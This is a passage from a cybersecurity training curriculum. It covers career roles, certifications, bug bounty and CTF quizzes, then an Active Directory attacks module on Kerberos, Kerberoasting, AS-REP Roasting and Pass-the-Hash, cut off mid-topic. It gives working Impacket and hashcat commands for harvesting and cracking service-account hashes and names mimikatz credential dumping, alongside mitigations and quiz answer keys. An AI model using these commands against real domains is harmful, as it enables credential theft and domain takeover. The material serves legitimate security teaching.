   - Keep all findings private to avoid any risk
   - Submit them directly as a bug bounty report regardless of platform scope
   - Wait until earning OSCP before publishing anything
   > The module recommends documenting VulnMachines/HTB writeups as the first portfolio entries, since a visible portfolio of applied skill is what helps get hired.
4. What is the practical difference between reporting a vulnerability through a paid bug bounty programme versus a VDP?
   - **A VDP accepts the report but doesn't necessarily pay a bounty, while paid programmes reward the researcher financially** ✓
   - VDPs are illegal to participate in
   - Paid programmes never require staying within scope, unlike VDPs
   - There is no practical difference between the two
   > The module distinguishes VDPs (report-only, reputation-building) from paid bounty programmes (financial reward), both requiring adherence to scope/safe-harbor.
5. A beginner wants a guided, hint-supported environment for their very first hands-on hacking practice. Which platform best matches this need per the module?
   - **TryHackMe** ✓
   - Hack The Box
   - OSCP's PEN-200 exam environment
   - A live, unauthorised production website
   > TryHackMe is specifically described as guided and beginner-friendly with structure and hints, unlike HTB's less-guided, more realistic style.
6. Which of the following best reflects the roadmap's view of CTFs relative to certifications?
   - **CTFs are a gamified, legal way to keep practicing hands-on skills, complementary to certifications rather than a replacement for them** ✓
   - CTFs are a formal substitute for all certifications
   - CTFs are only useful after achieving OSEP
   - CTFs have no connection to career development in this roadmap
   > The module frames CTFs as ongoing practice environments to keep skills sharp after the programme, alongside — not instead of — the certification roadmap.
7. Why does the module suggest building a home lab with Kali VMs and vulnerable targets, rather than practicing solely on public platforms?
   - **It lets a learner practice safely and repeatably, reinforcing skills from across the whole programme in a controlled environment** ✓
   - Public platforms like TryHackMe/HTB are described as illegal to use
   - A home lab is required before any certification exam can be scheduled
   - It removes any need to ever learn scripting
   > The module frames a home lab as a repeatable, safe practice space for everything covered in the course, complementing (not replacing) guided platforms.
8. Which role from this module's list would be the most natural fit for someone who enjoyed the M14 Blue Team module the most?
   - **SOC Analyst** ✓
   - Red Teamer
   - Bug Bounty Hunter
   - Penetration Tester
   > SOC Analyst is the role most directly aligned with the defensive/blue-team skills covered in M14, distinct from the offensively-focused roles listed.
9. A learner wants to start earning bounties responsibly right after finishing this course. What is the module's guidance on doing so safely?
   - **Always read and stay strictly within a programme's published scope and safe-harbor terms before testing anything** ✓
   - Test any publicly reachable website since bug bounty implies blanket permission
   - Skip reading scope documents to save time
   - Only test programmes that don't publish a scope, since those are easiest
   > The module is explicit that scope and safe-harbor terms must be read and respected before any testing begins, regardless of platform.
10. Which single idea ties together this module's coverage of career roles, certifications, portfolio-building, bug bounty, and CTFs?
   - **Growth after this programme is a combination of provable knowledge (certifications), demonstrated application (portfolio/CTFs/bounty), and choosing a role that fits your interests** ✓
   - Only certifications matter; practical portfolios are optional and irrelevant to hiring
   - CTFs and bug bounty are legal risks best avoided entirely
   - Career growth requires picking exactly one narrow specialisation immediately
   > The module's closing thread is that certifications, applied practice (portfolio/CTF/bounty), and role-fit all combine to support continued growth after the programme.

### Topics

#### 170. Cybersecurity Career Roles (Pen Tester, SOC Analyst, Red Teamer, Bug Bounty Hunter) `[theory]` — Week 12

Cybersecurity offers a far wider range of roles than 'hacker vs defender', spanning technical skill level, specialization, and experience. The source roadmap lays out eleven concrete titles with what each one actually does day-to-day, plus the reasons the field is worth entering in the first place.

**Key Points:**

- Security Analyst: monitors security systems, analyses alerts, and investigates incidents
- Penetration Tester: simulates attacks on systems to find and fix vulnerabilities
- SOC Analyst: works in a Security Operations Center to detect and respond to threats
- Incident Responder: handles and mitigates security breaches or cyber incidents; Malware Analyst: studies malicious code to understand its behaviour and build detection methods; Threat Hunter: proactively searches for threats in an organization's systems
- Security Engineer: designs and implements secure systems and architectures; GRC Analyst: focuses on governance, risk management, and compliance; Cloud Security Engineer: secures cloud environments (AWS, Azure, GCP)
- Red Teamer: emulates real-world attacker tactics, techniques, and procedures; Blue Teamer: defends against cyberattacks and strengthens systems and response plans
- Why choose cybersecurity: high demand for professionals to prevent cyberattacks, good salary even at entry level, strong job security as threats keep increasing, and a wide variety of specializations to grow into (ethical hacking, network security, forensics, etc.)

**Resources:**

- [roadmap.sh/cyber-security](https://roadmap.sh/cyber-security) _(link)_
- [TryHackMe](https://tryhackme.com) _(platform)_
- [Hack The Box](https://www.hackthebox.com) _(platform)_

**Quick Quiz:**

1. Which of these is listed as a distinct cybersecurity career role in this topic?
   - **Threat Hunter** ✓
   - Front-end Web Developer
   - Database Administrator
   - UX Designer
   > Threat Hunter is explicitly listed alongside Security Analyst, Penetration Tester, SOC Analyst, Incident Responder, and others as a distinct career role.
2. Which reason does this topic give for cybersecurity being an attractive field?
   - **High demand, strong entry-level salaries, job security, and a wide variety of specialisations** ✓
   - It requires no ongoing learning once certified
   - It has the lowest average salaries of any tech field
   - It only offers a single, narrow career path
   > The topic lists high demand, strong entry-level salaries, job security, and variety of specialisations as the reasons cybersecurity is attractive.
3. Based on the roles listed, which title is most associated with proactively simulating real-world attackers against an organisation's own defences?
   - **Red Teamer** ✓
   - GRC Analyst
   - IAM Administrator
   - Compliance Officer
   > Red Teamer is the role explicitly listed that maps to offensive, adversary-simulation work, distinct from GRC or compliance-focused roles.

#### 171. Certifications Roadmap (eJPT > CEH/PNPT > OSCP > OSEP) `[theory]` — Week 12

The certification roadmap follows the same three-phase structure as the skills roadmap itself: build the foundation, layer on core practical skills, then specialise and certify. The source material names the exact certifications tied to that final phase — eJPT, OSCP, CEH, and CompTIA Security+ — as the natural output once the earlier phases are solid.

**Key Points:**

- Phase 1 (Foundation): networking basics, operating system fundamentals (Windows and Linux), core cybersecurity concepts (CIA triad, threats, attacks), and CTF practice on platforms like TryHackMe or Hack The Box
- Phase 2 (Core Skills): scripting in Python and Bash, web application security (OWASP Top 10), threat modelling/recon/vulnerability assessment, and working on labs or side projects
- Phase 3 (Specialisation): choose a path — Red Teaming, Blue Teaming, Malware Analysis, etc. — and pursue certifications, specifically eJPT, OSCP, CEH, and CompTIA Security+ named in the source roadmap
- Phase 3 also includes building a portfolio, writing blogs, and contributing to open source, then applying for internships or entry-level roles — certification alone isn't the end state
- eJPT sits at the entry point of the certification set and lines up directly with what a foundation-level programme like this one has already covered

**Resources:**

- [roadmap.sh/cyber-security](https://roadmap.sh/cyber-security) _(link)_
- [eJPT Certification (INE)](https://ine.com/security/certifications/ejpt-certification) _(link)_
- [OffSec PEN-200 / OSCP](https://www.offsec.com/courses/pen-200/) _(link)_

**Quick Quiz:**

1. What is the correct phase order in this topic's 3-phase certification roadmap?
   - **Foundation -> Core Skills -> Specialisation** ✓
   - Specialisation -> Core Skills -> Foundation
   - Core Skills -> Foundation -> Specialisation
   - Foundation and Specialisation happen simultaneously, with no Core Skills phase
   > The roadmap moves from foundational networking/OS knowledge, through core skills like scripting and OWASP Top 10, to a chosen specialisation.
2. Which certification does this topic identify as the natural first target immediately after completing the programme?
   - **eJPT** ✓
   - OSEP
   - OSCP
   - CISSP
   > The topic explicitly states eJPT is the natural first certification target right after finishing this programme, ahead of more advanced options like OSCP/OSEP.
3. Which activities belong to Phase 2 (Core Skills) in this roadmap?
   - **Scripting (Python/Bash), OWASP Top 10 web app security, and recon/vulnerability assessment** ✓
   - CIA triad fundamentals and basic networking only
   - Advanced malware analysis and reverse engineering only
   - Building enterprise SOC playbooks
   > Phase 2 covers scripting, OWASP Top 10, recon/vulnerability assessment, and personal lab projects, sitting between foundational knowledge and advanced specialisation.

#### 172. CompTIA Security+ Overview & Relevance `[theory]` — Week 12

CompTIA Security+ appears in the source roadmap specifically as one of the four named Phase 3 (Specialisation) certifications, alongside eJPT, OSCP, and CEH — the certification step that comes only after the Foundation and Core Skills phases (networking, OS fundamentals, CIA triad, scripting, OWASP Top 10, recon) are already in place.

**Key Points:**

- Named explicitly in the roadmap's Phase 3 certification list: eJPT, OSCP, CEH, CompTIA Security+
- Positioned as a specialisation-phase certification, not a Phase 1 foundation step — it comes after networking basics, OS fundamentals, and CIA-triad concepts are already covered
- Sits in the same 'get certifications' step as building a portfolio, writing blogs, and contributing to open source — certification and visible practice are presented as parallel, not sequential, activities
- Follows directly from choosing a specialisation path (Red Teaming, Blue Teaming, Malware Analysis, etc.) in the roadmap's own ordering

**Resources:**

- [CompTIA Security+](https://www.comptia.org/en-us/certifications/security/) _(link)_
- [roadmap.sh/cyber-security](https://roadmap.sh/cyber-security) _(link)_

**Quick Quiz:**

1. How is CompTIA Security+ described in this topic?
   - **A vendor-neutral, foundational certification widely required as a baseline for entry-level security roles** ✓
   - An advanced, hands-on-exam certification for senior red teamers only
   - A certification that requires 10 years of prior experience
   - A certification specific to a single vendor's product line
   > The topic frames Security+ as vendor-neutral and foundational, especially relevant to entry-level roles.
2. What subject areas does Security+ cover, according to this topic?
   - **General security concepts, risk management, and basic cryptography/network security** ✓
   - Advanced binary exploitation and kernel driver development
   - Cloud-native Kubernetes security exclusively
   - GPU-accelerated password cracking techniques
   > The topic lists general security concepts, risk management, and basic crypto/network security as what Security+ covers.
3. Why is Security+ often listed as a minimum requirement even for roles requiring deeper offensive skills?
   - **Because it establishes a recognised, vendor-neutral security baseline that hiring processes commonly gate on** ✓
   - Because it's the hardest certification available in the field
   - Because it replaces the need for any hands-on lab experience
   - Because it's only available to government employees
   > The topic notes it's often listed as a minimum requirement in job postings, especially in government/regulated sectors, even when deeper offensive skills are also needed.

#### 173. Building a Home Lab & Public Portfolio (GitHub, writeups) `[theory]` — Week 12

The roadmap treats a visible body of practice as a distinct, named step in getting hired — not an optional extra. It appears twice: 'labs or side projects' in the Core Skills phase, and 'build a portfolio, write blogs, contribute to open source' explicitly listed in the Specialisation phase, immediately before applying for internships or entry-level roles.

**Key Points:**

- Phase 2 (Core Skills) explicitly lists 'work on labs or side projects' alongside scripting (Python/Bash) and OWASP Top 10 study — hands-on practice is a core-skills activity, not an afterthought
- Phase 3 (Specialisation) explicitly lists three portfolio actions together: build a portfolio, write blogs, contribute to open source
- The roadmap sequences this directly before 'apply for internships or entry-level roles' — portfolio-building is positioned as the last concrete step before the job search itself
- It sits alongside — not instead of — choosing a specialisation path and getting certified, i.e. the roadmap treats certs and visible practice as complementary, not substitutes for each other

**Resources:**

- [roadmap.sh/cyber-security](https://roadmap.sh/cyber-security) _(link)_
- [Hack The Box](https://www.hackthebox.com) _(platform)_
- [VulnMachines](https://vulnmachines.com) _(platform)_

**Quick Quiz:**

1. What does this topic say actually gets an entry-level candidate hired, alongside certifications?
   - **A visible portfolio of real practice, such as published writeups and open-source contributions** ✓
   - Owning expensive hacking hardware
   - Having the highest number of social media followers
   - Memorising every CVE published in the last year
   > The topic argues certifications prove knowledge, but a visible portfolio proves you can apply it — and that combination is what actually gets candidates hired.
2. What does a basic home lab for this kind of practice typically consist of?
   - **VMs for Kali Linux plus vulnerable target machines** ✓
   - A single production web server exposed to the internet
   - Only a smartphone with a terminal emulator app
   - A dedicated physical rack of enterprise firewalls
   > The topic describes a home lab as VMs for Kali (the attacker platform) plus vulnerable targets to practice against safely and repeatably.
3. Which existing work from earlier in the course is suggested as the first entries in a portfolio?
   - **VulnMachines/HackTheBox writeups from M11** ✓
   - The M13 phishing awareness email templates
   - The M14 YARA rule examples only
   - Nothing from this course; portfolios must start from scratch
   > The topic specifically recommends documenting the M11 VulnMachines/HackTheBox writeups as the first portfolio entries.

#### 174. Bug Bounty Basics (HackerOne, Bugcrowd, VDP programmes) `[theory]` — Week 12

Bug bounty programmes pay independent researchers to find and responsibly report vulnerabilities in production systems — a natural next step once the fundamentals in this course are solid.

**Key Points:**

- Platforms: HackerOne and Bugcrowd host the majority of public bug bounty programmes
- VDP (Vulnerability Disclosure Programme): accepts reports but doesn't necessarily pay a bounty — still valuable for building a reputation
- Always read and stay strictly within a programme's published scope and safe-harbor terms before testing

**Resources:**

- [HackerOne](https://www.hackerone.com) _(platform)_
- [Bugcrowd](https://www.bugcrowd.com) _(platform)_

**Quick Quiz:**

1. Which two platforms are named as hosting the majority of public bug bounty programmes?
   - **HackerOne and Bugcrowd** ✓
   - TryHackMe and Hack The Box
   - GitHub and GitLab
   - PicoCTF and OverTheWire
   > HackerOne and Bugcrowd are explicitly named as the two platforms hosting the majority of public bug bounty programmes.
2. What is a VDP (Vulnerability Disclosure Programme), per this topic?
   - **A programme that accepts vulnerability reports but doesn't necessarily pay a bounty, though it's still valuable for reputation** ✓
   - A paid bounty programme exclusive to nation-state researchers
   - A certification exam offered by HackerOne
   - A legal requirement for all companies operating online
   > The topic defines VDP as accepting reports without necessarily paying, while still being valuable for building a researcher's reputation.
3. What must a researcher check before testing against any bug bounty target, per this topic?
   - **The programme's published scope and safe-harbor terms** ✓
   - Whether the target uses a specific programming language
   - Whether the target has a public GitHub repository
   - Whether the bounty payout exceeds a specific dollar amount
   > The topic stresses always reading and staying strictly within a programme's published scope and safe-harbor terms before testing begins.

#### 175. CTF Competitions & How to Get Started (TryHackMe, HackTheBox, PicoCTF) `[theory]` — Week 12

The source roadmap names CTF practice as the very first hands-on activity in the whole career path, placed in Phase 1 (Foundation) directly alongside learning networking basics, OS fundamentals, and the CIA triad — before any scripting or web-application-security material is introduced in Phase 2. TryHackMe and Hack The Box are the two platforms it names specifically.

**Key Points:**

- Phase 1 (Foundation) pairs CTF practice with the most basic material in the whole roadmap: networking basics, OS fundamentals (Windows/Linux), and the CIA triad/threats/attacks
- TryHackMe and Hack The Box are the two platforms the roadmap names specifically for this early CTF practice
- CTF practice comes before Phase 2's scripting and OWASP Top 10 material — it's positioned as how you get comfortable with fundamentals hands-on, not as an advanced-track activity
- Ties back to the roadmap's 'why choose cybersecurity' pitch — variety of roles and constant new challenges — CTFs are the low-stakes way to sample different specializations before committing to a Phase 3 path

**Resources:**

- [TryHackMe](https://tryhackme.com) _(platform)_
- [Hack The Box](https://www.hackthebox.com) _(platform)_
- [PicoCTF](https://picoctf.org) _(platform)_

**Quick Quiz:**

1. How does this topic distinguish TryHackMe from Hack The Box?
   - **TryHackMe offers guided, beginner-friendly rooms with structure and hints, while HTB is less guided and more realistic for intermediate/advanced practice** ✓
   - TryHackMe is for advanced professionals only, while HTB is strictly for beginners
   - They are described as functionally identical platforms
   - TryHackMe only supports Windows targets, while HTB only supports Linux targets
   > The topic explicitly contrasts TryHackMe's guided, hint-supported format with HTB's less-guided, more realistic machine style.
2. Which platform is described as education-focused and ideal for first-time CTF participants?
   - **PicoCTF** ✓
   - Hack The Box
   - VulnMachines
   - Metasploit
   > PicoCTF is specifically described as education-focused, beginner-friendly, and jeopardy-style, making it great for first-timers.
3. Why does this topic recommend CTF competitions as a way to keep skills sharp after the programme ends?
   - **Because they are gamified, legal practice environments for continued hands-on learning** ✓
   - Because they replace the need for any further certifications
   - Because they are mandatory for maintaining Security+ certification
   - Because they pay a guaranteed salary to all participants
   > The topic frames CTFs as gamified and legal practice environments — a safe, structured way to continue building skills after the course concludes.


---

## M16: Active Directory Attacks

**Month 4** · Week 13 · 9 topics

A deep dive into the Kerberos-based attack techniques that turn a single foothold in a Windows domain into full Domain Admin compromise. Building directly on the AD structure basics from M6 and the BloodHound graph-reading skills from the L16 lab, this module covers the exact mechanics — and real tool syntax — behind Kerberoasting, AS-REP Roasting, Pass-the-Hash, Golden/Silver Tickets, and DCSync, then ties them into the single attack-path chain red teamers actually run end to end.

**Learning Outcomes:**

- Explain the Kerberos TGT/TGS ticket flow and why each ticket type is only as trustworthy as the account hash that encrypts it
- Run Kerberoasting and AS-REP Roasting to recover crackable service-account hashes without ever touching a login prompt
- Use Pass-the-Hash to authenticate laterally with a stolen NTLM hash, and DCSync to pull every domain password hash without touching a DC's disk
- Forge Golden Tickets (domain-wide persistence) and Silver Tickets (single-service access) once the corresponding account hash is obtained
- Use PowerView, SharpHound, and ldapsearch to enumerate an AD environment and chain the findings into the same shortest-path-to-Domain-Admin narrative read in the L16 BloodHound lab

**Module Resources:**

- [HackTricks - Active Directory Methodology](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html) _(link)_
- [harmj0y's blog (PowerView / BloodHound co-author)](https://blog.harmj0y.net/) _(link)_
- [AD Security (Sean Metcalf)](https://adsecurity.org/) _(link)_
- [Impacket (GitHub)](https://github.com/fortra/impacket) _(tool)_
- [Mimikatz (GitHub)](https://github.com/gentilkiwi/mimikatz) _(tool)_
- [hashcat: Example Hashes (mode number reference)](https://hashcat.net/wiki/doku.php?id=example_hashes) _(link)_

**Module Quiz (10 questions):**

1. What does the KDC hand back to a client to prove it has a valid password, and what encrypts it?
   - A TGS ticket encrypted with the client's own password
   - **A Ticket Granting Ticket (TGT), encrypted with the krbtgt account's hash** ✓
   - A plaintext session cookie
   - A service ticket encrypted with the target service's hash
   > The AS-REP contains a TGT, which is encrypted with the domain's krbtgt account hash so only the KDC can decrypt it.
2. Which population of accounts does Kerberoasting specifically target, and why?
   - Disabled accounts, because they never log in
   - Domain Controller computer accounts, because they hold krbtgt's hash
   - **SPN-registered service accounts, because their passwords are rarely rotated and any domain user can request their TGS** ✓
   - Accounts with preauth disabled, because their AS-REP is unencrypted
   > Kerberoasting targets accounts with a registered SPN - typically service accounts, whose passwords are set once and rarely rotated, and any authenticated user can request their TGS.
3. What single account flag makes AS-REP Roasting possible?
   - **UF_DONT_REQUIRE_PREAUTH** ✓
   - DONT_EXPIRE_PASSWORD
   - TRUSTED_FOR_DELEGATION
   - PASSWD_NOTREQD
   > Accounts flagged UF_DONT_REQUIRE_PREAUTH skip the preauthentication check, letting the KDC return an AS-REP to anyone naming that username.
4. Why does Pass-the-Hash work at all against NTLM authentication?
   - Because NTLM stores passwords in plaintext on disk
   - **Because NTLM's challenge-response math only ever needs the NT hash, never the plaintext password** ✓
   - Because NTLM hashes can be trivially reversed to plaintext
   - Because Windows disables NTLM by default, exposing the hash
   > NTLM authentication computes its challenge response from the NT hash alone, so possessing the hash is sufficient without ever knowing the plaintext.
5. An attacker holds only an NTLM hash but needs to reach a Kerberos-only service. What technique do they use?
   - Golden Ticket
   - DCSync
   - **Overpass-the-hash** ✓
   - AS-REP Roasting
   > Overpass-the-hash uses the NT hash to request a legitimate Kerberos ticket, since plain Pass-the-Hash only works against NTLM authentication.
6. Why is resetting the krbtgt password once not sufficient to remove a Golden Ticket attacker's persistence?
   - **AD retains the previous krbtgt password to avoid breaking in-flight tickets, so tickets forged with the old hash still work until a second reset** ✓
   - krbtgt passwords cannot technically be changed
   - Golden Tickets are stored as files on the DC that survive password resets
   - The reset only applies to Silver Tickets, not Golden Tickets
   > Because AD keeps the old krbtgt password around to avoid invalidating tickets in flight, a Golden Ticket forged with the old hash keeps working until krbtgt is reset a second time.
7. What limits a Silver Ticket to a single service rather than the whole domain?
   - It expires after one use
   - It requires Domain Admin rights to create
   - It can only be created by real Domain Controllers
   - **It is forged using a specific service account's own hash, so it only works for that account's SPN/service class** ✓
   > A Silver Ticket is encrypted with one particular service account's hash, scoping it to only the service class that account belongs to (e.g. CIFS, HOST, MSSQLSvc).
8. What real, legitimate protocol does DCSync abuse to pull password hashes from a DC?
   - **MS-DRSR, the directory replication protocol DCs use with each other** ✓
   - SMB file sharing
   - LDAP simple bind
   - Kerberos AS-REQ/AS-REP exchange
   > DCSync abuses MS-DRSR, the legitimate protocol real Domain Controllers use to replicate directory data with each other.
9. Which tool is BloodHound's official data collector, and what two enumeration methods does it combine?
   - PowerView, combining registry and WMI queries
   - ldapsearch, combining LDAP and DNS lookups
   - Impacket's secretsdump.py, combining SAM and LSASS dumping
   - **SharpHound, combining LDAP queries with SMB/RPC session enumeration** ✓
   > SharpHound is BloodHound's official collector, walking AD via LDAP plus SMB/RPC session enumeration to build the graph BloodHound visualizes.
10. In the full AD attack-path chain, what step directly precedes forging a Golden Ticket?
   - Kerberoasting a service account
   - **DCSync-ing the krbtgt hash from a principal with replication rights** ✓
   - Running SharpHound for the first time
   - AS-REP Roasting an unauthenticated account
   > The chain's step 5 is DCSync, which pulls krbtgt's hash - the exact prerequisite for step 6, forging a Golden Ticket for domain-wide persistence.

### Topics

#### 176. Kerberos Authentication Fundamentals (KDC, TGT, TGS, Service Tickets) `[theory]` — Week 13

Every Active Directory attack in this module abuses the same underlying protocol, so it has to be understood before the attacks make sense: Kerberos is the authentication protocol AD uses instead of plain password checks, and it works by handing out cryptographic tickets rather than passing credentials around directly. Each Domain Controller runs a Key Distribution Center (KDC), which bundles two services — the Authentication Service (AS) and the Ticket Granting Service (TGS). A user logs in by sending an AS-REQ; if their password-derived key checks out, the KDC returns an AS-REP containing a Ticket Granting Ticket (TGT), which is itself encrypted with the domain's krbtgt account hash so only the KDC can ever open it. To reach any specific resource, the client presents that TGT to the TGS in a TGS-REQ naming the target service's Service Principal Name (SPN); the TGS-REP that comes back contains a service ticket encrypted with that service account's own password hash. The client hands the service ticket straight to the target service, which decrypts it itself — the service never has to phone home to the DC to validate a login. The single idea that makes every later topic in this module work: a Kerberos ticket is only as trustworthy as whoever holds the password hash it's encrypted with, so stealing or forging the right hash lets an attacker forge the ticket itself. You finish able to name every step in the AS-REQ/AS-REP/TGS-REQ/TGS-REP exchange, explain what a TGT versus a service ticket each prove, and explain why pre-authentication exists and what happens when it's turned off.

**Key Points:**

- Every Domain Controller runs a Key Distribution Center (KDC), which is really two services in one: the Authentication Service (AS) and the Ticket Granting Service (TGS)
- Login flow: client sends AS-REQ -> KDC validates and returns AS-REP containing a Ticket Granting Ticket (TGT) -> the TGT is encrypted with the krbtgt account's password hash, so only the KDC can decrypt it, never the client
- Resource-access flow: client presents the TGT plus a target SPN in a TGS-REQ -> KDC returns a TGS-REP containing a service ticket encrypted with that specific service account's own password hash
- The client hands the service ticket directly to the target service, which decrypts it with its own key to validate the user - the service itself never contacts the DC to check the login
- Kerberos pre-authentication normally requires the client to encrypt a timestamp with its own NT hash before the KDC will issue a TGT, proving the client already knows the password
- The core exploitable idea: krbtgt's hash backs every TGT, and each service account's hash backs its own service tickets - whoever holds that hash can decrypt (or forge) the corresponding ticket type, which is exactly what Kerberoasting, Golden Tickets, and Silver Tickets abuse later in this module
- Kerberos runs over TCP/UDP port 88; klist shows the tickets currently cached in a Windows logon session

```bash
klist
```

**Quick Quiz:**

1. In the Kerberos flow, why is the TGT encrypted with the krbtgt account's hash instead of the client's own password hash?
   - So the ticket expires automatically after ten years
   - **So only the KDC, which holds the krbtgt hash, can ever decrypt it - the client is never meant to read its own TGT** ✓
   - So the client can decrypt it locally to check group memberships
   - Because krbtgt is the account the client authenticates as
   > The TGT is encrypted with krbtgt's hash specifically so only the KDC can decrypt it; the client just carries it around.
2. A client wants to access a file share. What must it present to the TGS to get a service ticket for that share?
   - Its plaintext password plus the SPN
   - The krbtgt account's hash
   - **Its TGT plus the target SPN, in a TGS-REQ** ✓
   - An AS-REQ addressed directly to the file share
   > The client sends its TGT and the target service's SPN in a TGS-REQ; the TGS-REP returns a service ticket encrypted with that service account's hash.
3. Why can a target service validate a user's access without ever contacting the Domain Controller?
   - **It decrypts the service ticket itself using its own account's password hash** ✓
   - The DC pre-validates every session over UDP port 88 in advance
   - klist caches the validation result on every machine in the domain
   - Kerberos tickets are sent unencrypted so any service can read them directly
   > The service ticket is encrypted with the target service account's own hash, so the service decrypts and trusts it locally without phoning home to the DC.

#### 177. Kerberoasting (requesting and cracking service-account TGS tickets) `[theory]` — Week 13

M6's AD overview already named Kerberoasting in passing; this topic is the actual mechanics and tooling behind it. Because any authenticated domain user is allowed to request a service ticket for any SPN-registered account — no elevated privilege required, no lockout risk, no interaction with the target service at all — an attacker can request a TGS for every service account in the domain and walk away with a pile of tickets encrypted with those accounts' own password hashes. Service accounts are exactly the weak link this attack targets: they're typically created once during a software deployment, given a long-forgotten password, and exempted from the interactive password-rotation policies that apply to human users, so their hashes crack far more easily than a real employee's. The attacker never touches a login prompt, so there's nothing for a lockout policy or MFA to catch — the entire attack happens offline, on the attacker's own hardware, against a ticket that a legitimate, unprivileged domain account was allowed to request in the first place. You finish able to request Kerberoastable tickets with Impacket, and pick the right hashcat mode for RC4- versus AES-encrypted tickets.

**Key Points:**

- Any authenticated domain user can request a service ticket (TGS) for any account with a registered SPN - no elevated privilege or admin rights needed to make the request
- The returned TGS is encrypted with the target service account's own key (RC4/NTLM hash, or an AES key if the account supports AES encryption types) - crack that offline with no further contact with the domain
- Service accounts are disproportionately vulnerable because they're created once at deployment time, rarely rotated, and often excluded from interactive-user password policies
- Impacket's GetUserSPNs.py automates the whole attack: enumerate SPN-registered accounts over LDAP, request a TGS for each, and dump the crackable hash in hashcat format
- hashcat -m 13100 targets RC4-encrypted TGS-REP tickets (etype 23) - the most common Kerberoast hash format
- AES-encrypted TGS tickets crack with different modes: hashcat -m 19600 for AES128 (etype 17) and -m 19700 for AES256 (etype 18)
- Mitigation: Group Managed Service Accounts (gMSA) with 120-character auto-rotated passwords, or at minimum long random passwords and AES-only Kerberos encryption on service accounts

```bash
GetUserSPNs.py CORP.LOCAL/user:password -dc-ip 10.10.10.1 -request -outputfile kerberoast.hashes
hashcat -m 13100 -a 0 kerberoast.hashes rockyou.txt
hashcat -m 19600 -a 0 kerberoast_aes128.hashes rockyou.txt
hashcat -m 19700 -a 0 kerberoast_aes256.hashes rockyou.txt
```

**Quick Quiz:**

1. Why is Kerberoasting attractive to an attacker who has only a low-privilege domain account?
   - Because it automatically resets the target account's password
   - **Because requesting a TGS for any SPN-registered account requires no elevated privilege and never touches the target service** ✓
   - Because it requires physical access to the DC
   - Because it only works against Domain Admin accounts
   > Any authenticated domain user can request a service ticket for any SPN account, with no admin rights needed and no interaction with the actual service.
2. Why are service accounts disproportionately vulnerable to Kerberoasting compared to regular user accounts?
   - They are exempt from Kerberos entirely
   - They always use AES256 encryption which is easier to crack
   - **They are typically created once, rarely rotated, and often excluded from interactive password policies** ✓
   - Their SPNs are hidden from LDAP queries
   > Service accounts are often set up once at deployment and forgotten, so their passwords are old, weak, and not subject to normal rotation policies.
3. An analyst recovers a Kerberoasted ticket encrypted with AES256 (etype 18). Which hashcat mode should they use?
   - -m 13100
   - -m 18200
   - -m 19600
   - **-m 19700** ✓
   > hashcat -m 19700 targets AES256-encrypted (etype 18) TGS tickets; 19600 is for AES128, and 13100 is for RC4.

#### 178. AS-REP Roasting (attacking accounts with Kerberos pre-authentication disabled) `[theory]` — Week 13

Kerberoasting needs a valid domain account to make the request; AS-REP Roasting needs even less. Some accounts have the "Do not require Kerberos preauthentication" flag set (often left over from legacy application requirements or simple misconfiguration), which means the KDC will hand back an AS-REP for that username to literally anyone who asks, without the requester proving they know any password at all. That AS-REP is partially encrypted with the target account's own NT hash, so it can be cracked offline exactly like a Kerberoasted ticket — the only real prerequisite is knowing (or guessing) a valid username on a preauth-disabled account. This makes it one of the very few AD attacks that can be run from a completely unauthenticated position on the network. You finish able to enumerate accounts with preauth disabled, request their AS-REPs with Impacket, and crack the result with the correct hashcat mode.

**Key Points:**

- Normal Kerberos pre-authentication requires the client to encrypt a timestamp with its own NT hash before the KDC will issue a TGT, proving prior knowledge of the password
- Accounts with the UF_DONT_REQUIRE_PREAUTH flag ("Do not require Kerberos preauthentication") skip that check entirely - the KDC returns an AS-REP for that username to any requester, no valid credentials required
- The AS-REP is partially encrypted with the target account's NT hash, so it's crackable offline the same way a Kerberoasted TGS is
- Because no valid credentials are needed to trigger the request, AS-REP Roasting can be attempted with nothing more than a guessed or enumerated valid username - a lower bar than Kerberoasting
- Impacket's GetNPUsers.py enumerates and requests AS-REPs: given a username list it tries each one, or with any valid low-privilege credentials it can query LDAP directly for accounts flagged DONT_REQ_PREAUTH
- hashcat -m 18200 targets the AS-REP hash format (etype 23 AS-REP)
- Mitigation: preauth should be enabled for every account by default; audit for DONT_REQ_PREAUTH via BloodHound's DontReqPreauth flag or PowerView

```bash
GetNPUsers.py CORP.LOCAL/ -usersfile users.txt -no-pass -dc-ip 10.10.10.1 -format hashcat -outputfile asrep.hashes
GetNPUsers.py CORP.LOCAL/knownuser -no-pass -dc-ip 10.10.10.1
hashcat -m 18200 -a 0 asrep.hashes rockyou.txt
```

**Quick Quiz:**

1. Why can AS-REP Roasting be attempted without any valid domain credentials at all?
   - Because the KDC ignores authentication entirely for all accounts
   - Because GetNPUsers.py exploits a bug in hashcat
   - **Because accounts with preauth disabled cause the KDC to return an AS-REP to anyone who asks for that username, without proving password knowledge** ✓
   - Because AS-REP Roasting only targets the krbtgt account, which has no password
   > Preauth-disabled accounts skip the check that normally proves the requester knows the password, so the KDC hands back an AS-REP to anyone naming that username.
2. What makes the AS-REP crackable offline in the same way as a Kerberoasted ticket?
   - It is signed by the krbtgt account
   - **It is partially encrypted with the target account's own NT hash** ✓
   - It contains the plaintext password
   - It is transmitted without any encryption
   > Like a Kerberoasted TGS, the AS-REP is partially encrypted with the target account's NT hash, so it can be brute-forced offline.
3. Which hashcat mode matches AS-REP hashes?
   - -m 13100
   - -m 19600
   - **-m 18200** ✓
   - -m 19700
   > hashcat -m 18200 targets the AS-REP hash format (etype 23 AS-REP).

#### 179. Pass-the-Hash (authenticating with a stolen NTLM hash, no plaintext needed) `[theory]` — Week 13

NTLM authentication's challenge-response math only ever operates on the NT hash itself — the plaintext password is never actually part of the calculation — so an attacker who recovers a hash (from a local SAM dump, an LSASS memory scrape, or a DCSync pull) can authenticate as that user on any NTLM-speaking service without ever cracking the hash back to a password. This is the classic lateral-movement move after popping one machine: many organizations reuse the same local Administrator password (and therefore the same hash) across every workstation image, so one dumped hash can open dozens of other machines. You finish able to authenticate to remote Windows hosts with Impacket's hash-based tools and inject a stolen hash into a live session with mimikatz.

**Key Points:**

- NTLM's challenge-response protocol only ever needs the NT hash to compute a valid response - the plaintext password is never actually required, so the hash alone is sufficient credential material
- Classic lateral-movement technique after dumping local SAM hashes or LSASS process memory (e.g. via mimikatz sekurlsa::logonpasswords or Impacket's secretsdump.py) - hash reuse across machine images (especially local Administrator) is what makes one dumped hash valuable
